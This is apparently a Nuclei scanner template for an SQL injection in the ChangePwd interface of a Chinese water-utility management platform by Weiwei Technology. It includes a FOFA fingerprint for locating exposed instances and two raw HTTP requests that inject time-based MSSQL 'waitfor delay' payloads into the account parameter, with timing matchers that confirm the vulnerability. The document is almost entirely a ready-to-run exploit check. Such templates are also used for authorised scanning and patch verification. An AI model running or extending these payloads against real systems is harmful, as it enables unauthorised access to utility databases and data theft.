id: weiwei-sql-injection
info:
  name: "潍微科技水务信息管理平台ChangePwd接口SQL注入"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: icon_hash="-491165370"
      潍微科技水务信息管理平台在ChangePwd接口存在SQL注入安全缺陷，攻击者可通过构造恶意SQL语句实现对后台数据库的未授权访问与操作，可能导致敏感数据泄露或数据完整性受损。
  tags: 潍微科技
http:
- raw:
  - |
    GET /Account/ChangePwd?oldpwd=123456&newpwd=123456&conpwd=123456&account=1%27;waitfor%20delay%20%270:0:5%27--+ HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate, br
    Connection: close
  - |
    GET /Account/ChangePwd?oldpwd=123456&newpwd=123456&conpwd=123456&account=1%27;waitfor%20delay%20%270:0:8%27--+ HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate, br
    Connection: close
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
